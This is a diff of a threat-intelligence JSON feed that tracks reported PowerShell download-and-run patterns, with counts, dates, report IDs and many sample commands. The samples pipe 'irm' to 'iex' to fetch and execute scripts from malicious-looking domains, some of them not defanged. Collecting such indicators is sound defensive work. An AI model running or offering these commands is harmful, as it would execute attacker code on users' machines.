@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 159,
-    "ReportCount": 159,
-    "FirstSeen": "2026-11-10T11:17:30.993000+00:00",
+    "DistinctPayloadCount": 158,
+    "ReportCount": 158,
+    "FirstSeen": "2026-11-10T12:33:41.704000+00:00",
     "LastSeen": "2026-11-17T10:23:18.552000+00:00",
     "ReportIds": [
-      "cmwalipbz006w0oml8w01xd4l",
       "cmwao8o3p01la0omlmotcq335",
       "cmwas5id7031q0oml6ns2yux3",
       "cmwaswd9d03gu0omleqib7jnh",
@@ -248,7 +247,6 @@
       "irm 'browse-cloud.codes/f7ed5df838d3e4b9'|iex;",
       "irm 'browse-cloud.codes/fa625dfc6bcfb436'|iex;",
       "irm 'browse-cloud.codes/fe2aab3b32968bba'|iex;",
-      "irm 'browse-nnccodes.beer/02275e4ee7b11819'|iex;",
       "irm 'browse-nnccodes.beer/036cf7940c1ef98c'|iex;",
       "irm 'browse-nnccodes.beer/04e36292744fbb51'|iex;",
       "irm 'browse-nnccodes.beer/04f8fc1791e00fc8'|iex;",
@@ -451,12 +449,11 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 40,
-    "ReportCount": 40,
-    "FirstSeen": "2026-11-10T11:23:14.942000+00:00",
+    "DistinctPayloadCount": 39,
+    "ReportCount": 39,
+    "FirstSeen": "2026-11-10T11:59:22.341000+00:00",
     "LastSeen": "2026-11-17T00:40:35.020000+00:00",
     "ReportIds": [
-      "cmwalq2qj00ch0omlecjbmf22",
       "cmwan0j4800yq0omlltp1f36f",
       "cmwanjbw9018m0omlq3184wsq",
       "cmwaofa4901pv0oml2dv9jutk",
@@ -526,7 +523,6 @@
       "(irm 'https://github[.]pw/wp/e9e0a4eb0e5a4b04')|iex",
       "(irm 'https://nexguard[.]pro/Girya/ff9a9c33c814a1a4')|iex",
       "(irm 'https://t-trustresnew[.]com/Girya/3a8b7746765169c8')|iex",
-      "(irm 'https://t-trustresnew[.]com/Girya/441fd4a04ee64f1b')|iex",
       "(irm 'https://t-trustresnew[.]com/Girya/7eeb7dc71e67e3f9')|iex",
       "(irm 'https://t-trustresnew[.]com/Girya/c2bb5e53eeac1f49')|iex",
       "(irm 'https://t-trustresnew[.]com/click/437fcc74237f6eaa')|iex",
